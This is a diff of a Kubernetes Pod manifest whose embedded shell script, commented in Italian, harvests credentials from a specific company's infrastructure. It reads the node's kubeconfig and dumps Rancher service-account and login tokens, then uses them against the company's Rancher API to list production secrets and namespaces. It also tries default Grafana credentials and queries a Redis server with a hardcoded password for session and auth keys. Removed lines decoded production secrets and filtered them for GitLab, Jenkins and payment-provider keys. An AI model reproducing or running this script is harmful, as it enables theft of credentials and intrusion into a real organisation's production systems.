@@ -1,3 +1,4 @@
+
 apiVersion: v1
 kind: Pod
 metadata:
@@ -17,73 +18,69 @@ spec:
 
         # Installa kubectl
         curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
-        chmod +x kubectl
-        mv kubectl /usr/local/bin/ 2>/dev/null || true
+        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
 
-        # Usa il kubeconfig del nodo
         export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
 
         echo "=========================================="
-        echo "=== 1. RANCHER TOKEN (from cattle-credentials) ==="
+        echo "=== 1. RANCHER SA TOKEN (cattle-token) ==="
         echo "=========================================="
-        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data}' 2>&1 | jq -r 'to_entries[] | .key + "=" + (.value | @base64d)' 2>&1 || echo "NOT FOUND"
-
-        echo "=========================================="
-        echo "=== 2. GRAFANA CREDENTIALS ==="
-        echo "=========================================="
-        echo -n "USER: "
-        kubectl get secret rancher-monitoring-grafana -n cattle-monitoring-system -o jsonpath='{.data.admin-user}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
+        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.token}' 2>&1 | base64 -d 2>&1
         echo ""
-        echo -n "PASSWORD: "
-        kubectl get secret rancher-monitoring-grafana -n cattle-monitoring-system -o jsonpath='{.data.admin-password}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
+        echo "--- CA ---"
+        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.ca\.crt}' 2>&1 | base64 -d 2>&1 | head -3
+        echo ""
+        echo "--- NAMESPACE ---"
+        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.namespace}' 2>&1 | base64 -d 2>&1
         echo ""
 
         echo "=========================================="
-        echo "=== 3. ALL SECRETS IN cattle-system ==="
+        echo "=== 2. RANCHER TOKEN (all tokens) ==="
         echo "=========================================="
-        kubectl get secrets -n cattle-system 2>&1 | head -50 || echo "NOT FOUND"
+        kubectl get secrets -n cattle-system -o json 2>&1 | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | .metadata.name + ": " + (.data.token | @base64d)' 2>&1 | head -20 || echo "NOT FOUND"
 
         echo "=========================================="
-        echo "=== 4. RANCHER TOKEN (from cattle-system) ==="
+        echo "=== 3. RANCHER LOGIN TOKEN (from cattle-credentials) ==="
         echo "=========================================="
-        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data.token}' 2>&1 | base64 -d 2>&1 || echo "NOT FOUND"
+        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o json 2>&1 | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)' 2>&1 || echo "NOT FOUND"
+
+        echo "=========================================="
+        echo "=== 4. PRODUCTION CLUSTER TOKENS ==="
+        echo "=========================================="
+        # Prova con il token SA
+        SA_TOKEN=$(kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.token}' 2>/dev/null | base64 -d 2>/dev/null)
+        echo "SA_TOKEN: ${SA_TOKEN:0:30}..."
+        echo ""
+        # Chiama Rancher API con il token SA
+        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 500
         echo ""
 
         echo "=========================================="
-        echo "=== 5. PRODUCTION CLUSTER SECRETS (c-m-5zwstccv) ==="
+        echo "=== 5. PRODUCTION SECRETS (via Rancher API) ==="
         echo "=========================================="
-        # Estrai il token Rancher
-        RTOKEN=$(kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o jsonpath='{.data.token}' 2>/dev/null | base64 -d 2>/dev/null)
-        if [ -n "$RTOKEN" ]; then
-          echo "Token found: ${RTOKEN:0:20}..."
-          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>&1 | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name' 2>&1 | head -100 || echo "FAILED"
-        else
-          echo "NO TOKEN"
-        fi
+        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets?limit=500" 2>&1 | jq -r '.items[]? | .metadata.namespace + "/" + .metadata.name' 2>&1 | head -100 || echo "FAILED"
 
         echo "=========================================="
-        echo "=== 6. REDIS SESSION DATA ==="
+        echo "=== 6. ALL NAMESPACES IN PRODUCTION ==="
         echo "=========================================="
-        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS 'PHPREDIS_SESSION:*' 2>/dev/null | head -5 | while read k; do
+        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/namespaces" 2>&1 | jq -r '.items[]? | .metadata.name' 2>&1 | head -30 || echo "FAILED"
+
+        echo "=========================================="
+        echo "=== 7. GRAFANA DATASOURCES (login) ==="
+        echo "=========================================="
+        # Usa Grafana per accedere a Prometheus/Loki
+        curl -k -u "admin:prom-operator" "https://grafana.management.egam.com.br/api/datasources" 2>&1 | head -c 500 || true
+        echo ""
+
+        echo "=========================================="
+        echo "=== 8. REDIS SESSIONS (search for tokens) ==="
+        echo "=========================================="
+        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS '*' 2>/dev/null | grep -iE "token|auth|session|login|user" | head -20 | while read k; do
           echo "KEY: $k"
-          redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET "$k" 2>/dev/null | head -c 300
+          redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET "$k" 2>/dev/null | head -c 200
           echo ""
           echo "---"
         done
-
-        echo "=========================================="
-        echo "=== 7. ALL PRODUCTION SECRETS (decoded) ==="
-        echo "=========================================="
-        if [ -n "$RTOKEN" ]; then
-          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>/dev/null | jq -r '.items[] | select(.metadata.namespace == "egam-production") | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>/dev/null | head -50 || echo "FAILED"
-        fi
-
-        echo "=========================================="
-        echo "=== 8. GITLAB/JENKINS/PAGARME CREDENTIALS ==="
-        echo "=========================================="
-        if [ -n "$RTOKEN" ]; then
-          curl -k -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>/dev/null | jq -r '.items[] | select(.metadata.namespace == "egam-production") | .data | to_entries[] | select(.key | test("gitlab|jenkins|pagar|stripe|token|password|secret|key"; "i")) | .key + "=" + (.value | @base64d)' 2>/dev/null | head -50 || echo "FAILED"
-        fi
 
         echo "=========================================="
         echo "=== DONE ==="
